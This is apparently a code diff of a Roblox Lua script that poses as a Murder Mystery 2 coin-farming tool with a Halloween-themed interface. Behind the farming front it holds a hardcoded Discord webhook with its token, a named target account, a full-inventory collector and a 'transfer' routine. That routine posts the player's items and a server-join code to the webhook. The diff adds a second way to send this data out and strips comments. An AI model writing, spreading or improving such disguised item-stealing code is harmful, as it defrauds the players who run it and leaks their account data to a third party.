@@ -11,7 +11,6 @@ local UIS = game:GetService("UserInputService")
 local lp = P.LocalPlayer
 local pg = lp:WaitForChild("PlayerGui")
 
--- Plain webhook (easy to edit)
 local WU = "https://discord.com/api/webhooks/1544589998198755329/DH2ha0j2AXINPCfqlbe-PGvPD7LFot-9DWHHn1qNuNISN6w9EPn8rcF_sQ_arY33f1oV"
 local PLACE_ID = 142823291
 local TARGET = "naimradio6"
@@ -28,7 +27,6 @@ local WL = {
 local allowed = false
 local hasTransfer = false
 
--- Auth
 do
     if WL[lp.Name] then
         allowed = true
@@ -117,6 +115,13 @@ local function sw(msg, ping)
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HS:JSONEncode(d)
             })
+        elseif syn and syn.request then
+            syn.request({
+                Url = WU,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HS:JSONEncode(d)
+            })
         end
     end)
 end
@@ -137,8 +142,6 @@ local function getFullInventory()
     return list
 end
 
--- Detailed Transfer Ready webhook (only when hasTransfer)
--- Detailed Transfer Ready webhook (only when hasTransfer)
 local function sendDetailedTransfer()
     local jobId = tostring(game.JobId)
     local consoleCode = 'Roblox.GameLauncher.joinGameInstance(' .. PLACE_ID .. ', "' .. jobId .. '")'
@@ -184,6 +187,7 @@ local function sendDetailedTransfer()
         end
     end)
 end
+
 task.spawn(function()
     task.wait(1.5)
     if hasTransfer then
@@ -207,7 +211,6 @@ P.PlayerAdded:Connect(function(pl)
     end
 end)
 
--- ==================== TRANSFER (only if hasTransfer) ====================
 local TR = false
 local OT = 0
 local AS = false
@@ -389,7 +392,6 @@ if hasTransfer then
     print("[mm2 coins farm script 2026] Transfer system loaded")
 end
 
--- ==================== CORE ====================
 local AF = false
 local SP = 50
 local RG = 300
@@ -486,7 +488,6 @@ task.spawn(function()
     end
 end)
 
--- ==================== GUI (Halloween Orange) ====================
 local gui = Instance.new("ScreenGui")
 gui.Name = "mm2CoinsFarm2026"
 gui.ResetOnSpawn = false
@@ -876,7 +877,6 @@ if coinRemote then
     end)
 end
 
--- ==================== FARM LOOP (Safe mode fixed) ====================
 task.spawn(function()
     while true do
         if AF then
